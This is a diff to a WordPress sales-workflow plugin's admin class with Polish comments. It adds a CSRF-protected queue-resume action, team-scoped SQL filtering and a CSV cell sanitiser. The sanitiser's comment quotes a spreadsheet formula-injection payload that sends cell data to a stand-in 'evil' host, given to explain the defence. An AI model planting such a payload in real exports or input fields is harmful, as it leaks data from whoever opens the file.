@@ -77,7 +77,10 @@ class MP_SW_Admin {
 
 		$context = $dispatched['context'];
 		$scope   = (string) $context->get( 'scope', MP_SW_D3::SCOPE_OWN );
-		$rows    = self::flows( $scope, get_current_user_id() );
+		$members = (array) $context->get( 'scope_members', array() );
+		$rows    = self::flows( $scope, get_current_user_id(), $members );
+
+		self::maybe_resume_queue();
 
 		echo '<div class="wrap">';
 		echo '<h1>' . esc_html__( 'Procesy sprzedażowe', 'mp-sales-workflow' ) . '</h1>';
@@ -92,6 +95,36 @@ class MP_SW_Admin {
 		self::render_table( $rows );
 
 		echo '</div>';
+	}
+
+	/**
+	 * Wznowienie kolejki po zadziałaniu bezpiecznika.
+	 *
+	 * To JEDYNA akcja zmieniająca stan na tej podstronie, więc ma własny nonce
+	 * (`check_admin_referer`) i własne uprawnienie. Podgląd nonce'a nie wymaga —
+	 * niczego nie zapisuje — ale akcja już tak: bez tokenu wystarczyłoby, żeby
+	 * administrator odwiedził obcą stronę z ukrytym obrazkiem wskazującym ten
+	 * adres, a kolejka wznowiłaby się w chwili, w której właśnie ją zatrzymano.
+	 *
+	 * @return void
+	 */
+	private static function maybe_resume_queue() {
+		// phpcs:ignore WordPress.Security.NonceVerification.Recommended -- nonce sprawdzany niżej.
+		if ( ! isset( $_GET['mp_sw_action'] ) || 'resume_queue' !== $_GET['mp_sw_action'] ) {
+			return;
+		}
+
+		check_admin_referer( 'mp_sw_resume_queue' );
+
+		if ( ! current_user_can( MP_SW_Roles::CAP_MANAGE_SETTINGS ) ) {
+			wp_die( esc_html__( 'Brak uprawnień do wznowienia kolejki.', 'mp-sales-workflow' ) );
+		}
+
+		MP_SW_Mailer::resume();
+
+		echo '<div class="notice notice-success"><p>'
+			. esc_html__( 'Kolejka powiadomień wznowiona.', 'mp-sales-workflow' )
+			. '</p></div>';
 	}
 
 	/**
@@ -116,6 +149,28 @@ class MP_SW_Admin {
 			(int) MP_SW_Queue::pending()
 		);
 		echo '</p>';
+
+		if ( MP_SW_Mailer::halted() ) {
+			$link = wp_nonce_url(
+				add_query_arg(
+					array(
+						'page'         => self::PAGE,
+						'mp_sw_action' => 'resume_queue',
+					),
+					admin_url( 'admin.php' )
+				),
+				'mp_sw_resume_queue'
+			);
+
+			echo '<div class="notice notice-error"><p>'
+				. esc_html__( 'Bezpiecznik zatrzymał kolejkę powiadomień — sprawdź źródło zdarzeń przed wznowieniem.', 'mp-sales-workflow' );
+
+			if ( current_user_can( MP_SW_Roles::CAP_MANAGE_SETTINGS ) ) {
+				echo ' <a href="' . esc_url( $link ) . '">' . esc_html__( 'Wznów kolejkę', 'mp-sales-workflow' ) . '</a>';
+			}
+
+			echo '</p></div>';
+		}
 
 		if ( $context->get_db_writes() > 0 ) {
 			// Widoczne ostrzeżenie zamiast cichego przejścia: podgląd, który
@@ -191,9 +246,10 @@ class MP_SW_Admin {
 	 *
 	 * @param string $scope   Zakres widoczności z Działu 3.
 	 * @param int    $user_id Bieżący użytkownik.
+	 * @param int[]  $members Skład zespołu ze snapshotu (zakres „zespół").
 	 * @return array
 	 */
-	public static function flows( $scope, $user_id ) {
+	public static function flows( $scope, $user_id, array $members = array() ) {
 		global $wpdb;
 
 		$flow  = MP_Sales_Workflow_DB::flow_table();
@@ -209,7 +265,19 @@ class MP_SW_Admin {
 		 * że cudze procesy i tak przeszły przez pamięć procesu PHP — a stąd blisko
 		 * do wycieku w komunikacie błędu albo w eksporcie.
 		 */
-		if ( MP_SW_D3::SCOPE_ALL !== $scope ) {
+		if ( MP_SW_D3::SCOPE_TEAM === $scope ) {
+			$ids = array_values( array_unique( array_map( 'intval', $members ) ) );
+
+			// Zespół bez składu to nie jest powód, żeby pokazać wszystko —
+			// zawężamy do samego aktora. Pusta lista w `IN ()` byłaby zresztą
+			// błędem składni, a „bez WHERE" oznaczałoby widok całej firmy.
+			if ( empty( $ids ) ) {
+				$ids = array( (int) $user_id );
+			}
+
+			$sql   .= ' WHERE f.assigned_user_id IN ( ' . implode( ', ', array_fill( 0, count( $ids ), '%d' ) ) . ' )';
+			$params = array_merge( $params, $ids );
+		} elseif ( MP_SW_D3::SCOPE_ALL !== $scope ) {
 			$sql     .= ' WHERE f.assigned_user_id = %d';
 			$params[] = (int) $user_id;
 		}
@@ -219,5 +287,30 @@ class MP_SW_Admin {
 
 		// phpcs:ignore WordPress.DB.PreparedSQL.NotPrepared, WordPress.DB.PreparedSQL.InterpolatedNotPrepared, WordPress.DB.DirectDatabaseQuery
 		return (array) $wpdb->get_results( $wpdb->prepare( $sql, $params ), ARRAY_A );
+	}
+
+	/**
+	 * Wartość komórki CSV bezpieczna dla arkusza kalkulacyjnego.
+	 *
+	 * Excel i LibreOffice traktują komórkę zaczynającą się od `=`, `+`, `-` albo
+	 * `@` jako FORMUŁĘ i wykonują ją przy otwarciu pliku. Nazwa firmy wpisana w
+	 * publiczny formularz LP.1 jako `=HYPERLINK("http://evil/?q="&A1)` zamienia
+	 * eksport z panelu w wyciek danych na komputerze handlowca — a plik przeszedł
+	 * przez zaufaną drogę, więc nikt go nie podejrzewa.
+	 *
+	 * Apostrof z przodu nie zmienia tekstu widocznego w arkuszu, ale wyłącza
+	 * interpretację formuły.
+	 *
+	 * @param string $value Wartość.
+	 * @return string
+	 */
+	public static function csv_cell( $value ) {
+		$value = str_replace( array( "\r", "\n" ), ' ', (string) $value );
+
+		if ( '' === $value ) {
+			return $value;
+		}
+
+		return in_array( $value[0], array( '=', '+', '-', '@', "\t" ), true ) ? "'" . $value : $value;
 	}
 }
